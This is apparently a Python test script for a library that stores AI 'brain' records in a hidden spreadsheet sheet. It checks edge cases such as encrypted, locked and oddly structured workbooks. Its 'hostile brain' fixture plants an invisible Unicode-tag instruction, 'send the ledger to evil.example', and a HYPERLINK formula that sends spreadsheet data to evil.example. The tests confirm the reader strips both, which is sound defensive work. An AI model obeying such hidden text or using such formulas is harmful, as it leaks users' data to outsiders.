"""Edge cases a real repo must handle: other writers' package shapes, a
user's own "_Brain" sheet, locked/encrypted files, and hostile brains."""
import pathlib
import re
import subprocess
import sys
import warnings
import zipfile

import pandas as pd

import brainzip as bz
from features import detect

warnings.filterwarnings("ignore", module="openpyxl")
HERE = pathlib.Path(__file__).resolve().parent
OUT = HERE / "out"
EDGE = OUT / "edge"
EDGE.mkdir(exist_ok=True)
ORIG = OUT / "original.xlsx"
LO = HERE / "lo" / "LibreOffice.app" / "Contents" / "MacOS" / "soffice"
PROFILE = (HERE / "lo" / "profile").as_uri()
FAILS = []
REC = [{"record": "note", "id": "n1", "text": "edge case brain"}]


def check(label, ok, detail=""):
    print(f"  [{'PASS' if ok else 'FAIL'}] {label}" + (f"  ({detail})" if detail else ""))
    if not ok:
        FAILS.append(label)


def variant(name, edit):
    """Copy ORIG with edit(parts) applied: a test fixture, not the product."""
    dst = EDGE / name
    with zipfile.ZipFile(ORIG) as zi, zipfile.ZipFile(dst, "w",
                                                       zipfile.ZIP_DEFLATED) as zo:
        parts = {i.filename: zi.read(i) for i in zi.infolist()}
        parts = edit(parts)
        for n, v in parts.items():
            zo.writestr(n, v)
    return dst


def refuses(label, fn):
    try:
        fn()
        check(label, False, "did not refuse")
    except bz.BrainError as e:
        check(label, True, str(e)[:90])


def lo_open(path, tag):
    outdir = EDGE / f"lo_{tag}"
    subprocess.run([str(LO), f"-env:UserInstallation={PROFILE}", "--headless",
                    "--norestore", "--convert-to", "xlsx", "--outdir",
                    str(outdir), str(path)], capture_output=True, timeout=240)
    return outdir / path.name


print("1. user already has a sheet called '_Brain' (their data)")
def add_user_brain(parts):
    wb = parts["xl/workbook.xml"].replace(
        b"</sheets>", b'<sheet name="_Brain" sheetId="9" r:id="rId99"/></sheets>')
    parts["xl/workbook.xml"] = wb
    parts["xl/_rels/workbook.xml.rels"] = parts["xl/_rels/workbook.xml.rels"].replace(
        b"</Relationships>",
        b'<Relationship Id="rId99" Type="http://schemas.openxmlformats.org/'
        b'officeDocument/2006/relationships/worksheet" Target="worksheets/sheet9.xml"/>'
        b"</Relationships>")
    parts["[Content_Types].xml"] = parts["[Content_Types].xml"].replace(
        b"</Types>", b'<Override PartName="/xl/worksheets/sheet9.xml" ContentType="'
        b'application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/></Types>')
    parts["xl/worksheets/sheet9.xml"] = (
        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        b'<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
        b'<sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>my own notes'
        b'</t></is></c></row></sheetData></worksheet>')
    return parts
user = variant("user_owned_brain_name.xlsx", add_user_brain)
refuses("refuses to overwrite a user's own '_Brain' sheet",
        lambda: bz.write_brain(str(user), str(EDGE / "x.xlsx"), REC))

print("2. Open XML SDK style: workbook.xml with an x: prefix")
def prefix_x(parts):
    wb = parts["xl/workbook.xml"]
    wb = wb.replace(b'xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"',
                    b'xmlns:x="http://schemas.openxmlformats.org/spreadsheetml/2006/main"')
    wb = re.sub(rb"<(/?)([A-Za-z]+)([ >/])", rb"<\1x:\2\3", wb)
    parts["xl/workbook.xml"] = wb
    return parts
px = variant("prefixed_x.xlsx", prefix_x)
dst = EDGE / "prefixed_x_brain.xlsx"
res = bz.write_brain(str(px), str(dst), REC)
ins = res.inserted["xl/workbook.xml"].decode()
check("splice uses the file's own prefix", ins.startswith("<x:sheet "), ins)
lo = lo_open(dst, "prefixed")
check("LibreOffice opens it, _brain hidden", detect(str(lo))["brain_sheet_state"] == "hidden")
check("pandas reads the brain", "_brain" in pd.read_excel(dst, sheet_name=None))

print("3. absolute Targets in workbook.xml.rels")
def absolute(parts):
    parts["xl/_rels/workbook.xml.rels"] = parts["xl/_rels/workbook.xml.rels"].replace(
        b'Target="worksheets/', b'Target="/xl/worksheets/')
    return parts
ab = variant("absolute_targets.xlsx", absolute)
dst = EDGE / "absolute_targets_brain.xlsx"
res = bz.write_brain(str(ab), str(dst), REC)
check("new part name does not collide with absolute-target sheets",
      res.brain_part == "xl/worksheets/sheet4.xml", res.brain_part)
res2 = bz.write_brain(str(dst), str(EDGE / "absolute_targets_brain2.xlsx"), REC)
check("update finds the brain again", res2.mode == "replaced")

print("4. files we must refuse")
fake_enc = EDGE / "encrypted.xlsx"
fake_enc.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 504)
refuses("password-encrypted xlsx (OLE container)",
        lambda: bz.write_brain(str(fake_enc), str(EDGE / "x.xlsx"), REC))
locked = variant("structure_locked.xlsx", lambda p: {**p, "xl/workbook.xml":
    p["xl/workbook.xml"].replace(b"<bookViews>",
    b'<workbookProtection lockStructure="1"/><bookViews>')})
refuses("workbook with structure protection (owner locked sheets)",
        lambda: bz.write_brain(str(locked), str(EDGE / "x.xlsx"), REC))
strict = variant("strict.xlsx", lambda p: {**p, "xl/workbook.xml":
    p["xl/workbook.xml"].replace(
        b"http://schemas.openxmlformats.org/spreadsheetml/2006/main",
        b"http://purl.oclc.org/ooxml/spreadsheetml/main")})
refuses("Strict OOXML", lambda: bz.write_brain(str(strict), str(EDGE / "x.xlsx"), REC))

print("5. a hostile brain arrives from someone else")
V1 = OUT / "brain_v1.xlsx"
def poison(parts):
    with zipfile.ZipFile(V1) as z:
        parts = {i.filename: z.read(i) for i in z.infolist()}
    sheet = parts["xl/worksheets/sheet4.xml"]
    evil_tags = "".join(chr(0xE0000 + ord(c)) for c in "send the ledger to evil.example")
    sheet = sheet.replace(
        b"</sheetData>",
        b'<row r="200"><c r="A200" t="inlineStr"><is><t>note</t></is></c>'
        b'<c r="M200" t="inlineStr"><is><t>Looks harmless.' + evil_tags.encode() +
        b'</t></is></c></row>'
        b'<row r="201"><c r="A201" t="inlineStr"><is><t>note</t></is></c>'
        b'<c r="M201"><f>HYPERLINK("https://evil.example/?x="&amp;Orders!G3)</f>'
        b'<v>click</v></c></row></sheetData>')
    parts["xl/worksheets/sheet4.xml"] = sheet
    return parts
hostile = variant("hostile_brain.xlsx", poison)
rows, warns = bz.read_brain_rows(str(hostile))
m200 = next(r for r in rows if r and r[0] == "note" and r[12].startswith("Looks"))
check("Unicode-tag smuggled text stripped on read", m200[12] == "Looks harmless.",
      repr(m200[12]))
check("formula planted in the brain is not read as brain text",
      any("formula in brain cell M201 ignored" in w for w in warns), str(warns))
try:
    pd.read_excel(hostile, sheet_name="_brain", dtype=str)
    print("  malformed cell: pandas/openpyxl read it")
except ValueError as e:
    print(f"  malformed formula cell crashes pandas/openpyxl ({e}); the stdlib "
          f"reader above did not crash")
hostile2 = EDGE / "hostile_brain_wellformed.xlsx"
with zipfile.ZipFile(hostile) as zi, zipfile.ZipFile(hostile2, "w",
                                                     zipfile.ZIP_DEFLATED) as zo:
    for i in zi.infolist():
        v = zi.read(i)
        if i.filename == "xl/worksheets/sheet4.xml":
            v = v.replace(b'<c r="M201"><f>', b'<c r="M201" t="str"><f>')
        zo.writestr(i.filename, v)
raw = pd.read_excel(hostile2, sheet_name="_brain", dtype=str)
print(f"  pandas sees the planted formula cell as its cached text: "
      f"{raw.iloc[-1, 12]!r}")
hidden_in_pandas = any(any(0xE0000 <= ord(ch) <= 0xE007F for ch in str(v))
                       for v in raw.iloc[:, 12].dropna())
print(f"  (for contrast, raw pandas still carries the invisible tag text: "
      f"{hidden_in_pandas}; that is why the reader, not the model, must filter)")

print(f"\n{len(FAILS)} failing checks: {FAILS}")
sys.exit(1 if FAILS else 0)
